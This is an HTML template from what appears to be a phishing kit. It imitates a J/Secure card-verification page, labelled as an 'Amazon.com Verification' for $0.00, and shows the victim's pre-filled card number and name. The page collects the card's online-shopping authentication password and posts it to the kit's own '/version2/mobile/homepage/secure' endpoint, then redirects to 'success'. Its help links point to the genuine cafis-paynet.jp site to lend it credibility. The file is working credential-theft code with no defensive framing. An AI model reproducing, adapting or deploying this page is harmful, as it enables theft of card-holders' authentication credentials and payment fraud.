
<html><head>
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link href="card/a3/ntt.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" type="text/css" href="card/a3/foundation_V_PC.css">
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />
    <title>
        J/Secure
    </title>

    <script src="../js/jquery.min.js"></script>
    <script src="../js/jquery.validate.min.js"></script>
    <style>
        .error {
            color: red
        }

        #zwimel {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: #fff;
            z-index: 99;
            text-align: center;
        }

        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
    </style>
</head>

<body onload="SetFocus()" bgcolor="#ffffff">

<script language="Javascript">
    function SetFocus()
    {
        document.formvbv.passvbv.focus();
    }
    function ForgotPassword()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/dispatcher.jsp","forgotPasswordWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Help()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/help_smcc_m.jsp","helpWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Cancel()
    {
        history.back();
    }
</script>

<form method="post" id="formvbv" name="formvbv" action="">
    <center>
        <table cellpadding="0" cellspacing="0" border="0">
            <tbody><tr>
                <td>
                    <table cellpadding="0" cellspacing="0" border="0" width="350px">
                        <tbody><tr>
                            <td valign="top">
                                <table cellpadding="0" cellspacing="0" border="0" width="100%">
                                    <tbody><tr>
                                        <td>
                                            <table bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
                                                <tbody><tr>
                                                    <td align="left" width="50%">
                                                        <img src="card/a3/${image!'all.jpg'}" border="0" alt="J/Secure" title="J/Secure">
                                                    </td>

                                                    <td align="right" width="50%">

                                                    </td>
                                                </tr>
                                                </tbody></table>
                                            <#--<br>-->
                                        </td>
                                    </tr>
                                    </tbody></table>
                                <div class="protection">Added Protection</div>
                                <br>
                                <div class="message">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;We will verify your identity in order to provide customers with safe Internet shopping.Please enter the "password (*)" of the "online shopping authentication service" registered with the card you use. (Please note that this is different from your credit card security code(CVV or CVC))</div>

                                <table cellpadding="3" cellspacing="0" border="0" width="100%">
                                    <tbody>
                                    <tr>
                                        <td align="left" height="10"><img src="card/a3/spacer.gif" height="10" width="1"></td>
                                    </tr>
                                    <tr>
                                        <td valign="top" align="left">
                                            <table cellpadding="3" cellspacing="0" border="0" width="100%">

                                                <tbody><tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        Store name:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                        Amazon.com Verification
                                                    </td>
                                                </tr><tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        Amount of money:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                        $0.00
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        Date:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                    ${dateTime!''}                </td>
                                                </tr>
                                                <tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        Card number:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                        **** **** **** ${cardNo!''}                </td>
                                                </tr>
                                                <tr>
                                                    <td class="normalgray" valign="top" align="right" width="165px">
                                                        Card holder：
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" class="normalgray" width="165px">
                                                    ${cardName!''}
                                                    </td>
                                                </tr>

                                                <tr>
                                                    <td class="normalgray" valign="center" width="165px" align="right">
                                                        Password:
                                                    </td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" width="165px">
                                                        <!-- no errors, retain password -->

                                                        <input type="password" maxlength="32" size="20" id="passvbv" name="passvbv" value="" autocomplete="off" minlength="6" >

                                                    </td>

                                                </tr>



                                                <tr>
                                                    <td>&nbsp;</td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" align="left">
                                                        <a class="forgotlink" href="javascript:ForgotPassword()">
                                                            Forget your password
                                                        </a>
                                                    </td>
                                                </tr>

                                                <tr height="10">
                                                    <td><img src="card/a3/spacer.gif"></td>
                                                </tr>
                                                <tr>

                                                    <td valign="top" align="left">&nbsp;</td>
                                                    <td width="10px">
                                                    </td>
                                                    <td valign="top" align="left" width="165px">

                                                        <table cellpadding="0" cellspacing="0" border="0" width="165px">
                                                            <tbody><tr>
                                                                <td nowrap="">
                                                                    <input type="submit" id="sendButton" value="Send">
                                                                </td>
                                                                <td nowrap="">
                                                                    <a class="normallink" href="javascript:Help()">
                                                                        <img height="12" width="12" src="card/a3/help.jpg" border="0" alt="help" title="help">
                                                                    </a>

                                                                </td>
                                                                <td nowrap="">
                                                                    <a class="normallink" href="javascript:Help()">
                                                                        <font class="normallink">help</font>
                                                                    </a>

                                                                </td>
                                                                <td nowrap="">
                                                                    <a class="normallink" href="javascript:Cancel()">
                                                                        <font class="normallink">Cancel</font>
                                                                    </a>

                                                                </td>
                                                            </tr>
                                                            </tbody></table>

                                                    </td>

                                                </tr>

                                                </tbody></table>
                                        </td>
                                    </tr>
                                    </tbody></table>



                            </td></tr><tr>
                        </tr></tbody></table><table cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" border="0" bordercolor="#88A0B8" width="100%">
                    <tbody><tr>
                        <td class="copyright" align="center">

                        </td>
                    </tr>
                    </tbody></table>
                </td></tr>

            </tbody></table>

    </center>

</form>
<div id="zwimel" class="zwimel" style="display:none;"><img id="loading-image" src="../style/img/loading.gif">
</body>
<script>
    $("form[name='formvbv']").validate({
        rules: {
            passvbv: {
                required:true,
                minlength:6
            },
            mmname: {
                required:true
            }
        },
        messages: {
            passvbv: {minlength:"<p>正しいパスワードをご入力ください。</p>"},
            mmname: "",
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("/version2/mobile/homepage/secure", $("#formvbv").serialize(),
                    function(result) {
                        setTimeout(function() {
                                    $("#zwimel").hide();
                                    $(location).attr("href", "success")
                                },
                                2000)
                    })
        },
    });
    function SetFocus()
    {
        document.formvbv.passvbv.focus();
    }
    function ForgotPassword()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/dispatcher.jsp","forgotPasswordWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Help()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/help_smcc_m.jsp","helpWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Cancel()
    {
        history.back();
    }
</script>
</html>